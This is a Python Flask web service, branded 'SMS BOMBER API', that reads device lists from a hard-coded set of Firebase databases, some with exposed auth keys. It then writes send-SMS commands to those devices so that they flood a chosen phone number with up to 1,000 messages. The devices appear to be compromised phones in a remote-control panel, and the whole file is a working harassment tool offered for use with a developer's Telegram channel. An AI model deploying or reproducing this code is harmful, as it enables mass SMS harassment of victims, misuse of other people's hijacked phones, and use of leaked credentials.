from flask import Flask, request, jsonify
import requests
import json
import time
import random
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import os

app = Flask(__name__)

# ===== SIRF ONLINE DEVICES WALE FIREBASE =====
FIREBASE_CONFIGS = [
    {"name": "sex-panel", "url": "https://sex-panel-default-rtdb.firebaseio.com", "auth": "ASURPAPA"},
    {"name": "chudgy", "url": "https://chudgy-1cdca-default-rtdb.firebaseio.com", "auth": "ASURPAPA"},
    {"name": "nitu", "url": "https://nitu-2f326-default-rtdb.firebaseio.com", "auth": "ASURPAPA"},
    {"name": "admin-panel", "url": "https://admin-panel-b2935-default-rtdb.firebaseio.com", "auth": "ASURPAPA"},
    {"name": "kingu", "url": "https://kingu-2dbb9-default-rtdb.firebaseio.com", "auth": "ASURPAPA"},
    {"name": "ritesh0001", "url": "https://ritesh0001-ea582-default-rtdb.firebaseio.com", "auth": "ASURPAPA"},
    {"name": "tika3", "url": "https://tika3-a400c-default-rtdb.firebaseio.com", "auth": "ASURPAPA"},
    {"name": "aug1", "url": "https://aug1-ea7c9-default-rtdb.firebaseio.com", "auth": "ASURPAPA"},
    {"name": "xxx-kumar", "url": "https://xxx-kumar-default-rtdb.firebaseio.com", "auth": "ASURPAPA"},
    {"name": "money", "url": "https://money-ace2c-default-rtdb.firebaseio.com", "auth": "ASURPAPA"},
    {"name": "mpariwhan", "url": "https://mpariwhan-default-rtdb.firebaseio.com", "auth": "ASURPAPA"},
    {"name": "jama", "url": "https://jama-d7d04-default-rtdb.firebaseio.com", "auth": "ASURPAPA"},
    {"name": "abhiyogi", "url": "https://abhiyogi-8b07e-default-rtdb.firebaseio.com", "auth": "ASURPAPA"},
    
    # ===== Jo kaam kar rahe hain (extra) =====
    {"name": "simadevi", "url": "https://simadevi-f42fc-default-rtdb.firebaseio.com", "auth": "AIzaSyBkccFcYJ-FfClxHMztRAyropULYvxKsW0"},
    {"name": "gandhi-ji", "url": "https://gandhi-ji-1-default-rtdb.asia-southeast1.firebasedatabase.app", "auth": "ERA"},
    {"name": "joginder", "url": "https://joginder-jhatkila-default-rtdb.asia-southeast1.firebasedatabase.app", "auth": "ERA"},
]

# ============================================================

MAX_SMS_PER_DEVICE = 100
device_usage = {}

def safe_int(value):
    if not value:
        return 0
    if isinstance(value, int):
        return value
    if isinstance(value, str):
        cleaned = ''.join(filter(str.isdigit, value))
        return int(cleaned) if cleaned else 0
    return 0

def get_today():
    return datetime.now().strftime("%Y-%m-%d")

def can_send(device_id):
    key = f"{device_id}_{get_today()}"
    return device_usage.get(key, 0) < MAX_SMS_PER_DEVICE

def increment_usage(device_id):
    key = f"{device_id}_{get_today()}"
    device_usage[key] = device_usage.get(key, 0) + 1

def get_remaining(device_id):
    key = f"{device_id}_{get_today()}"
    return MAX_SMS_PER_DEVICE - device_usage.get(key, 0)

def fetch_devices(config):
    url = f"{config['url']}/clients.json?auth={config['auth']}"
    try:
        response = requests.get(url, timeout=10)
        if response.status_code != 200:
            return []
        data = response.json()
        if not data:
            return []
        devices = []
        for client_id, info in data.items():
            is_online = info.get('status') == True or safe_int(info.get('battery')) > 0
            if is_online:
                devices.append({
                    "id": client_id,
                    "firebase": config['name'],
                    "config": config
                })
        return devices
    except:
        return []

def fetch_all_devices():
    all_devices = []
    for config in FIREBASE_CONFIGS:
        devices = fetch_devices(config)
        all_devices.extend(devices)
    return all_devices

def send_sms(config, client_id, to_number, message):
    url = f"{config['url']}/clients/{client_id}/webhookEvent/sendSms.json?auth={config['auth']}"
    payload = {
        "from": random.randint(1, 99),
        "to": str(to_number),
        "message": str(message),
        "isSended": False,
        "timestamp": int(time.time() * 1000)
    }
    try:
        response = requests.put(url, json=payload, timeout=10)
        if response.status_code in [200, 201, 204]:
            increment_usage(client_id)
            return True
        return False
    except:
        return False

# ============================================================

@app.route('/')
def home():
    return f"""
✅ SMS BOMBER API LIVE!
📡 {len(FIREBASE_CONFIGS)} Firebase Databases
📱 {MAX_SMS_PER_DEVICE} SMS per device per day

📌 USE: /send?number=9999999999&msg=Hello&count=10
🔍 STATUS: /status
🔄 RESET: /reset

👨‍💻 Developer: @noobsater
📢 Channel: t.me/noob11001
    """

@app.route('/send')
def send_sms_api():
    number = request.args.get('number')
    message = request.args.get('msg')
    count = int(request.args.get('count') or 1)
    
    if not number or not message:
        return jsonify({"success": False, "error": "Number and message required!"}), 400
    
    max_count = min(count, 1000)
    
    all_devices = fetch_all_devices()
    online_devices = [d for d in all_devices if d.get('is_online')]
    available_devices = [d for d in online_devices if can_send(d['id'])]
    
    if not available_devices:
        return jsonify({
            "success": False,
            "error": "No available devices!",
            "total": len(all_devices),
            "online": len(online_devices),
            "available": 0
        }), 404
    
    tasks = []
    idx = 0
    while len(tasks) < max_count:
        device = available_devices[idx % len(available_devices)]
        if get_remaining(device['id']) > 0:
            tasks.append(device)
        idx += 1
        if idx % len(available_devices) == 0:
            if not any(can_send(d['id']) for d in available_devices):
                break
    
    sent, failed = 0, 0
    
    def worker(device):
        success = send_sms(device['config'], device['id'], number, message)
        return success, device['id'][:8]
    
    with ThreadPoolExecutor(max_workers=5) as ex:
        for success, _ in ex.map(worker, tasks):
            if success:
                sent += 1
            else:
                failed += 1
    
    return jsonify({
        "success": True,
        "target": number,
        "message": message,
        "requested": max_count,
        "sent": sent,
        "failed": failed,
        "total_devices": len(all_devices),
        "online_devices": len(online_devices),
        "available_devices": len(available_devices),
        "firebases": len(FIREBASE_CONFIGS),
        "developer": "@noobsater",
        "channel": "t.me/noob11001"
    })

@app.route('/status')
def status_api():
    all_devices = fetch_all_devices()
    online = [d for d in all_devices if d.get('is_online')]
    available = [d for d in online if can_send(d['id'])]
    
    return jsonify({
        "success": True,
        "total": len(all_devices),
        "online": len(online),
        "available": len(available),
        "firebases": len(FIREBASE_CONFIGS),
        "limit_per_device": MAX_SMS_PER_DEVICE,
        "developer": "@noobsater"
    })

@app.route('/reset')
def reset_api():
    global device_usage
    device_usage = {}
    return jsonify({"success": True, "message": "Reset done!"})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
